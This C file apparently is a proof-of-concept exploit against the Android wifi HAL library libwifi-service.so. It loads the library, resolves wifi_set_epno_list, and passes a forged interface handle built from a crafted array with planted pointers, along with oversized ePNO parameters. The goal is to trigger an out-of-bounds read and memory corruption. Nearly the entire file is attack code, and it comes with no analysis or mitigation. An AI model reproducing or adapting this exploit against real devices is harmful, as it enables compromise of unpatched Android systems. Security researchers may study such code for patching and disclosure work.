#include<stdio.h>
#include<string.h>

#include<dlfcn.h>

typedef enum {
    WIFI_SUCCESS = 0,
    WIFI_ERROR_NONE = 0,
    WIFI_ERROR_UNKNOWN = -1,
    WIFI_ERROR_UNINITIALIZED = -2,
    WIFI_ERROR_NOT_SUPPORTED = -3,
    WIFI_ERROR_NOT_AVAILABLE = -4,              // Not available right now, but try later
    WIFI_ERROR_INVALID_ARGS = -5,
    WIFI_ERROR_INVALID_REQUEST_ID = -6,
    WIFI_ERROR_TIMED_OUT = -7,
    WIFI_ERROR_TOO_MANY_REQUESTS = -8,          // Too many instances of this request
    WIFI_ERROR_OUT_OF_MEMORY = -9
} wifi_error;

typedef int wifi_request_id;
typedef unsigned char byte;
typedef byte mac_addr[6];
typedef int wifi_rssi;
typedef int wifi_channel;

typedef struct {
    char ssid[32+1];     // null terminated
    byte flags;          // WIFI_PNO_FLAG_XXX
    byte auth_bit_field; // auth bit field for matching WPA IE
} wifi_epno_network;

#define MAX_EPNO_NETWORKS 64
/* ePNO Parameters */
typedef struct {
    int min5GHz_rssi;               // minimum 5GHz RSSI for a BSSID to be considered
    int min24GHz_rssi;              // minimum 2.4GHz RSSI for a BSSID to be considered
    int initial_score_max;          // the maximum score that a network can have before bonuses
    int current_connection_bonus;   // only report when there is a network's score this much higher
                                    // than the current connection.
    int same_network_bonus;         // score bonus for all networks with the same network flag
    int secure_bonus;               // score bonus for networks that are not open
    int band5GHz_bonus;             // 5GHz RSSI score bonus (applied to all 5GHz networks)
    int num_networks;               // number of wifi_epno_network objects
    wifi_epno_network networks[MAX_EPNO_NETWORKS];   // PNO networks
} wifi_epno_params;

typedef int64_t wifi_timestamp;                 // In microseconds (us)
typedef int64_t wifi_timespan;                  // In picoseconds  (ps)

typedef struct {
    wifi_timestamp ts;                  // time since boot (in microsecond) when the result was
                                        // retrieved
    char ssid[32+1];                    // null terminated
    mac_addr bssid;
    wifi_channel channel;               // channel frequency in MHz
    wifi_rssi rssi;                     // in db
    wifi_timespan rtt;                  // in nanoseconds
    wifi_timespan rtt_sd;               // standard deviation in rtt
    unsigned short beacon_period;       // period advertised in the beacon
    unsigned short capability;          // capabilities advertised in the beacon
    unsigned int ie_length;             // size of the ie_data blob
    char         ie_data[1];            // blob of all the information elements found in the
                                        // beacon; this data should be a packed list of
                                        // wifi_information_element objects, one after the other.
    // other fields
} wifi_scan_result;


typedef struct {
    // on results
    void (*on_network_found)(wifi_request_id id,
            unsigned num_results, wifi_scan_result *results);
} wifi_epno_handler;

struct wifi_info;
struct wifi_interface_info;
typedef struct wifi_info *wifi_handle;

#define IFNAMSIZ 16
typedef struct {
    wifi_handle handle;
    char name[IFNAMSIZ+1];
    int id;
} interface_info;

typedef interface_info *wifi_interface_handle;

typedef wifi_error (*fn_wifi_set_epno_list)(wifi_request_id id, wifi_interface_handle iface,
        const wifi_epno_params *params, wifi_epno_handler handler );


int main( void )
{
    char * target_function_name="wifi_set_epno_list";
    fn_wifi_set_epno_list wifi_set_epno_list;

    void *handle;
    handle = dlopen( "/system/lib64/libwifi-service.so", RTLD_LAZY );
    if ( handle == NULL ) {
        printf( "[-] Failed to load libwifi-service.so\n" );
        return -1;
    }

    dlerror();

    wifi_set_epno_list = dlsym( handle, target_function_name );
    if ( wifi_set_epno_list == NULL ) {
        printf( "[-] Can not resolve symbol wifi_set_epno_list\n" );
        return -1;
    }

    int dummy[100];
    char cmd[100];
    printf( "[+] info's address : %p\n", dummy );
    int i=0;
    for (; i< 100; i++ ){
        dummy[i] = (int *)(0x41414100 + i);
        if( i == 0x1e ) {
           dummy[i-4] = (unsigned long)cmd & 0xFFFFFFFF;
           dummy[i-3] = (unsigned long)cmd >> 32;
           dummy[i-2] = 0x0;
           dummy[i-1] = 0x42424242;
        }
    }
    interface_info iface;
    iface.handle = (wifi_handle)dummy;

    wifi_epno_params *params;
    params = (wifi_epno_params *)malloc( sizeof( wifi_epno_params ) );
    if ( params == NULL ) {
        printf( "[-] not enough memory\n" );
        return -1;
    }
    memset( params, 0x41, sizeof(wifi_epno_params) );
    //params->num_networks = 0x41414141;;
    params->num_networks = 20;
    for ( i=0; i<5; i++ ) {
        params->networks[i].ssid[32] = '\0';
    }

    wifi_epno_handler han = {0};

    printf( "[+] Trigger the read out of buffer\n" );
    wifi_error result;
    result = wifi_set_epno_list( 0, &iface, params, han);

    printf( "[+] result : %d\n", result );

    return 0;
}
